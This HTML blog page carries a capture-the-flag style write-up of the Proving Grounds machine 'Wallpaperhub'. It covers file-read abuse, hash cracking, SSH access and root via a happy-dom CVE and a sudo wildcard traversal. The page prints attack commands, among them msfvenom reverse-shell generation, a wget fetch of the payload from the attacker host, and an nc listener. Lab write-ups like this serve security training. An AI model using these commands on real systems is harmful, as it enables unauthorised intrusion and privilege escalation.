<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <title>Matthew Castro - Blog</title>
    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico" />
    <!-- Font Awesome icons (free version)-->
    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
    <!-- Google fonts-->
    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
        type="text/css" />
    <link
        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
        rel="stylesheet" type="text/css" />
    <!-- Core theme CSS (includes Bootstrap)-->
    <link href="../../css/styles.css" rel="stylesheet" />
    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
    <link rel="preload" as="image" href="/assets/img/posts.jpg">
</head>

<body>
    <!-- Navigation-->
    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
        <div class="container px-4 px-lg-5">
            <a class="navbar-brand" href="../../index.html">Matthew Castro</a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                Menu
                <i class="fas fa-bars"></i>
            </button>
            <div class="collapse navbar-collapse" id="navbarResponsive">
                <ul class="navbar-nav ms-auto py-4 py-lg-0">
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">Homelab</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../reports.html">Reports</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../Write-ups.html">Write-ups</a></li>
                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../about.html">About</a></li>
                </ul>
            </div>
        </div>
    </nav>
    <!-- Page Header-->
    <header class="masthead" style="background-image: url('../../assets/img/posts.jpg')">
        <div class="container position-relative px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <div class="post-heading">
                        <h2>Wallpaperhub - Proving Grounds Write-up</h2>
                        <span class="meta">
                            Posted on January 1st, 2026
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <!-- Post Content-->
    <article class="mb-4">
        <div class="container px-4 px-lg-5">
            <div class="row gx-4 gx-lg-5 justify-content-center">
                <div class="col-md-10 col-lg-8 col-xl-7">
                    <p>We start by visiting the webserver on port 5000 and registering with an account. We then login
                        and capture an upload request with burp. We can change the filename in the request and point to
                        any file on the system we have read permissions on. We can then retrieve the file with the
                        download image functionality.
                        <p></p>
                        Command(s) used:
                        <p></p>
                        <span class="grey-line">sudo nmap -sU -f -T 5 192.168.229.204</span>

                        
                    </p>
                    <img class="img-fluid" src="../../assets/img/writeups/wallpaperhub_1.png" alt="..." />
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/wallpaperhub_2.png" alt="..." />
                    <p>
                        We then read the bash history file in the wp_hub user&#39;s home directory. The contents point us
                        towards a database file, which once we read allows us to obtain the user&#39;s hash. We crack
                        the hash and connect to the machine via SSH.
                        <p></p>
                        Command(s) used:
                        <p></p>
                        <span class="grey-line">hashcat hash /usr/share/wordlists/rockyou.txt</span>
                        <p></p>
                        <span class="grey-line">ssh wp_hub@192.168.229.204</span>
                        <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/wallpaperhub_3.png" alt="..." />
                        <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/wallpaperhub_4.png" alt="..." />
                    </p>
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/wallpaperhub_5.png" alt="..." />
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/wallpaperhub_6.png" alt="..." />
                    <p>
                        We then check our permissions and find that we are allowed to run the following command as root:
                        /usr/bin/web-scraper /root/web_src_downloaded/*.html. If we print out the contents of the
                        script, we notice that it is printing certain lines from any given html file. We also notice it
                        is a symlink to the script in /opt/scraper. After researching the node modules used within the
                        script, we find CVE-2024-51757 and follow this POC: >https://security.snyk.io/vuln/SNYK-JS-HAPPYDOM-8350065.
                        The attack is simple: we enter the payload into an html file in temp and run the sudo command.
                        We use the wildcard in the permitted command to change from the intended root directory to /tmp.
                        <p></p>
                        Command(s) used:
                        <p></p>
                        <span class="grey-line">sudo -l</span>
                        <p></p>
                          <span class="grey-line">sudo /usr/bin/web-scraper /root/web_src_downloaded/../../tmp/test.html</span>
                    </p>
                    <img class="img-fluid" src="../../assets/img/writeups/wallpaperhub_7.png" alt="..." />
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/wallpaperhub_8.png" alt="..." />
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/wallpaperhub_9.png" alt="..." />
                    <p></p>
                    <img class="img-fluid" src="../../assets/img/writeups/wallpaperhub_10.png" alt="..." />
                    <p></p>
                    <p>We transfer a shell to the temp directory, modify the payload to execute the shell and obtain a
                        reverse shell as root.
                        <p></p>
                        Command(s) used:
                        <p></p>
                        <span class="grey-line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.239 LPORT=5000 -f elf &gt; shell</span>
                        <p></p>
                         <span class="grey-line">wget http://192.168.45.239:5000/shell</span>
                        <p></p>
                        <span class="grey-line">rlwrap nc -lvnp 5000</span>
                        <p></p>
                        <span class="grey-line">chmod +x shell</span>
                        </p>
                    <img class="img-fluid" src="../../assets/img/writeups/wallpaperhub_11.png" alt="..." />
                    <p></p>

                </div>
            </div>
        </div>
    </article>
    <!-- Bootstrap core JS-->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <!-- Core theme JS-->
    <script src="js/scripts.js"></script>
</body>

</html>